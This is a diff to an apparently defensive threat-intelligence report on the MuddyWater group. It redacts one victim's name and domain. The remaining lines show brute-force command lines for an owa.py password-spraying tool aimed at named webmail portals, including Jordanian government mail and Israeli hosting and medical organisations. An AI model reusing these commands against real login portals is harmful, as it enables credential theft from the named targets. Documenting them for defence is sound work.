@@ -114,7 +114,7 @@ Aside from exploiting vulnerabilities, *MuddyWater* has attempted to password sp
 ```bash
 python owa.py -u users.txt -p morepasswd.txt -f url.txt -m bf -t 10 # Linked to https://webmail.gov.jo
 
-python owa.py -f mail.nmdc-group[.]com -u owausernames.txt -p pass.txt -o out.txt -m bf -t 1
+python owa.py -f mail.[REDACTED] -u owausernames.txt -p pass.txt -o out.txt -m bf -t 1
 
 python3 owa.py --url https://gohost.co[.]il/owa/auth/logon.aspx --username user.txt --password pass.txt --threads 5 
 
@@ -125,7 +125,7 @@ python3 owa.py --url https://mail.terem[.]com --username user.txt --password pas
 ```
 
 * **Jordan Government Webmail** 
-* **NMDC Group**: UAE based  provider of marine dredging, energy EPC (Engineering, Procurement, and Construction), 
+* **UAE based**: provider of marine dredging, energy EPC (Engineering, Procurement, and Construction) 
 * **Host & Found (gohost.co[.]il)**: Israeli Managed IT / hosting provider
 * **Bet Hadar**: Israeli Medical rehabilitation and nursing center
 * **Terem**: Israeli urgent-care / walk-in medical clinic network 
